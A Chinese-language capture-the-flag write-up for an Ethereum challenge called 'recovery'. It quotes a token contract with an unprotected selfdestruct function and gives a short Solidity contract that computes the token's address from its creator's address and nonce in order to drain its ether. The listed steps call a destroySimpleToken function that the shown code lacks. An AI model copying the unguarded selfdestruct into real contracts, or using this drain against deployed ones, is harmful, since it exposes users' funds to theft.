# recovery
## 題目
<img width="636" alt="截圖 2024-09-18 下午10 50 38" src="https://github.com/user-attachments/assets/45950f5b-9640-4999-bd76-90d96bb83175">

### point：
1. **合約地址推算**：在以太坊中，當合約創建時，它的地址是根據創建者地址和創建者的交易 nonce 計算出來的。這意味著，如果我們知道某個合約創建了另一個合約，我們可以根據該合約的地址推算出被創建合約的地址。
2. **`selfdestruct` 函數**：這個函數可以用來銷毀合約並將剩餘的以太幣轉移到指定地址。這裡，我們會利用 `SimpleToken` 合約中的 `destroy` 函數來達成這個目的。

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```
#### Recovery 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    // Generate tokens by creating a new SimpleToken contract
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}
```
- `Recovery` 合約中的 `generateToken` 函數會創建一個新的 `SimpleToken` 合約，但不會儲存其地址。我們需要推算出這個新合約的地址，然後進行攻擊。

#### SimpleToken 合約
```solidity
contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // Constructor to initialize token name and balance for the creator
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // Accept Ether and assign tokens based on value
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // Allow token transfer
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // Destroy the contract and transfer remaining Ether to a specified address
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```
- `SimpleToken` 合約有 `selfdestruct` 函數，我們可以利用它來銷毀合約並將剩餘資金轉回到指定的地址。

## hack
```solidity
pragma solidity ^0.8.0;

// 0x8186f965Fb89F4Ca221d2F62d92A6E33a7d4e8c6?
interface ISimpleToken {
    function name() external view returns (string memory);
    function destroy(address to) external;
}

// 0x99CE90aEae1DcFC3A5E0050287e4ea3788799854
interface IRecovery {}

contract Dev {
    function recover(address sender) external pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
        address addr = address(uint160(uint256(hash)));
        return addr;
    }
}
```
### 攻擊流程：
1. 部署 `Dev` 合約。
2. 使用 `recover` 函數計算出 `SimpleToken` 的地址：
   - 將 `Recovery` 合約的地址和 nonce 作為參數傳入，計算出新創建的 `SimpleToken` 合約的地址。
3. 使用 `destroySimpleToken` 函數來調用 `SimpleToken` 的 `destroy` 函數，將 `SimpleToken` 合約中的資金轉移到攻擊者的地址。



### 總結：
這個攻擊利用了 Solidity 中合約地址的可推算性以及 `selfdestruct` 函數來回收被銷毀的資金。通過推算出目標合約的地址並調用其 `selfdestruct`，我們可以將合約內的剩餘資金轉移到我們自己的帳戶。
